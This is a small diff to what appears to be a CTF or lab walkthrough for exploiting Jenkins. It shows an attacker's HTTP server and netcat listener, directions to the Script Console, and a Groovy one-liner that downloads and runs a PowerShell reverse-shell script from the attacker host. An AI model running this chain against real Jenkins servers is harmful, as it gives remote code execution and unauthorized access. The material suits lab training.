@@ -7,8 +7,11 @@ py
 $ python -m http.server 8888
 
 $ nc -nlvp 443
+```
 
-Navigate to http://IP:8080/script
+Navigate to http://IP:8080/script or access the console at `Manage Jenkins > Script Console`
+
+```
 println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.159.51:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.159.51 -Port 443".execute().text
 ```
 
